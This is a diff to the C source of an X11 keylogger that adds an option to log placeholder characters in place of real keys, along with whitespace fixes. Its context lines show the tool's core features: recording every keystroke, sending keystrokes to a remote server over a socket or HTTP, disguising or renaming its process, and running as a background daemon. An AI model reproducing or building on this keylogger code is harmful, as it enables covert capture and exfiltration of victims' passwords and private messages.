@@ -29,6 +29,7 @@
 
 #include <X11/Xlib.h>
 #include <X11/X.h>
+#include <X11/Xutil.h>
 
 #ifdef _HAVE_CURL
   #include <curl.h>
@@ -74,7 +75,7 @@ int main (int argc, char ** argv) {
 	if((config.display == NULL) && (getenv("DISPLAY") != NULL)
 		&& (strlen(getenv("DISPLAY")) > 0))
 		config.display = strdup(getenv("DISPLAY"));
-	else if(config.display == NULL) 
+	else if(config.display == NULL)
 		config.display = X_DEFAULT_DISPLAY;
 
 	dsp = XOpenDisplay(config.display);
@@ -99,11 +100,15 @@ int main (int argc, char ** argv) {
 
 		for( i = 0; i < XKBD_WIDTH * BITS_PER_BYTE; i++ )
 			if(getbit(kbd, i) != getbit(tmp, i) && getbit(kbd, i)) {
-				keystroke = decodeKey(i, getbit(kbd, i), getMods(kbd));
+                                if (config.anonymize) {
+				        keystroke = decodeKey(38, getbit(kbd, i), getMods(kbd)); // 38 == "a" key, doesn't matter as long as it's printable...
+                                } else {
+                                        keystroke = decodeKey(i, getbit(kbd, i), getMods(kbd));
+                                }
 
 				/* Log & flush every stroke, unless -l is specified */
 				if(!flag_uselinebuf) {
-					log( 1, config.logfd, "%s", keystroke);
+                                        log( 1, config.logfd, "%s", keystroke);
 					fflush(config.logfd);
 				} else
 					linebuf_update((const char*)keystroke, &config);
@@ -112,7 +117,7 @@ int main (int argc, char ** argv) {
 					transmit_keystroke_inet(keystroke, &config);
 
 				if(config.log_remote_http)
-					transmit_keystroke_http(keystroke, &config, 
+					transmit_keystroke_http(keystroke, &config,
 						config.log_remote_http_nodelay ? 1 : 0);
 			}
 	}
@@ -152,7 +157,7 @@ int linebuf_update(const char* s, struct config_struct* config){
 		printf("LOLOL\n");
 		linebuf.buf[strlen(linebuf.buf)-1] = 0;
 	};
-	
+
 
 
 	/* Fix for AltGr-key combinations on german keyboards */
@@ -219,11 +224,12 @@ struct tm* initialize(int argc, char ** argv, struct config_struct* config) {
 	config->port = 0;
 	config->daemonize = 0;
 	config->obfuscate = 0;
+	config->anonymize = 0;
 	config->log_remote_http_nodelay = 0;
 	config->log_remote_http_post = 0;
 
 	/* parse cmdline arguments */
-	while((c = getopt(argc, argv, "PO:s:f:lH:h:?r:qdo")) != -1){
+	while((c = getopt(argc, argv, "PO:s:f:lH:h:?r:qdoa")) != -1){
 		switch(c) {
 		  case 's':
 			if(strcmp(optarg, X_DEFAULT_DISPLAY) == 0)
@@ -265,11 +271,14 @@ struct tm* initialize(int argc, char ** argv, struct config_struct* config) {
 			config->process_fakename = smalloc(sizeof(char) * strlen(optarg) +1);
 			strcpy(config->process_fakename, optarg);
 		  case 'o':
-			config->obfuscate= 1;
+			config->obfuscate = 1;
 			break;
 		  case '?':
 			print_usage(argv[0]);
 			exit(EXIT_FAILURE);
+		  case 'a':
+			config->anonymize = 1;
+			break;
 		  default:
 			break;
 		}
@@ -351,6 +360,7 @@ void print_usage(char* basename){
 	log(0, stderr, "   -q              Be quiet (no output to console).\n");
 	log(0, stderr, "   -o              Obfuscate process name in process table.\n");
 	log(0, stderr, "   -O <NAME>       Rename process to given argument.\n");
+	log(0, stderr, "   -a              Anonymize keys and use a placeholder instead.\n");
 	log(0, stderr, "   -?              Print usage.\n");
 }
 
@@ -391,14 +401,14 @@ char* decodeKey(int code, int down, int mod) {
 	*/
 
 	/*
-	if(mod == CONTROL_DOWN) 
+	if(mod == CONTROL_DOWN)
 		printf("[C-DOWN]");
 		//sprintf(keystroke_readable, "%c%c%c", '^', keystroke_readable[0], '\0');
 
-	if(mod == ALT_DOWN) 
+	if(mod == ALT_DOWN)
 		//sprintf(keystroke_readable, "%c%c%c", '+', keystroke_readable[0], '\0');
 
-	if(mod == LOCK_DOWN) 
+	if(mod == LOCK_DOWN)
 		printf("[L-DOWN]");
 		//keystroke_readable[0] = toupper(keystroke_readable[0]);
 	*/
@@ -446,18 +456,18 @@ void signal_handler(int sig) {
 	  case(SIGHUP):
 		log(1, stderr, "\n -- SIGHUP: flushing log.\n");
 		flag_flush = 1;
-	  	return; 
+	  	return;
 	}
 }
 
 void clean_exit(struct config_struct* cfg){
 	if(cfg->logfd != stdout)
 		fclose(cfg->logfd);
-	
+
 	/* Transmit very last keystroke-buffer chunk if HTTP logging is enabled */
 	if (cfg->log_remote_http)
 		transmit_keystroke_http( "", cfg, 1 );
-	
+
 	/* Free dynamically allocated memory */
 	if( strcmp(cfg->display, X_DEFAULT_DISPLAY) != 0)
 		free( cfg->display );
@@ -551,7 +561,7 @@ int transmit_keystroke_http(char* key, struct config_struct *cfg, int sendnow){
 void log(int level, FILE* stream, const char *fmt, ...) {
 	va_list args;
 	va_start(args, fmt);
-	
+
 	if(verbosity >= level || (stream != stdout && stream != stderr))
 		vfprintf(stream, fmt, args);
 
@@ -561,14 +571,14 @@ void log(int level, FILE* stream, const char *fmt, ...) {
 
 int daemonize(char* child_process_name, struct config_struct* cfg){
 	pid_t pid, sid;
-	
+
 	pid  = fork();
-	if(pid < 0) 
+	if(pid < 0)
 		fatal("Error forking process");
 
 	if(pid > 0)
 		exit(EXIT_SUCCESS);
-	
+
 	umask(0);
 
 	sid = setsid();
@@ -594,7 +604,7 @@ int daemonize(char* child_process_name, struct config_struct* cfg){
 
 void* smalloc(size_t size) {
 	void* ptr;
-	
+
 	if((ptr = malloc(size)) == NULL)
 		fatal("Unable to allocate memory");
 
@@ -607,4 +617,3 @@ size_t curl_blackhole(void* unused, size_t size, size_t nmemb, void* none) {
 	return size * nmemb;
 }
 #endif //_HAVE_CURL
-
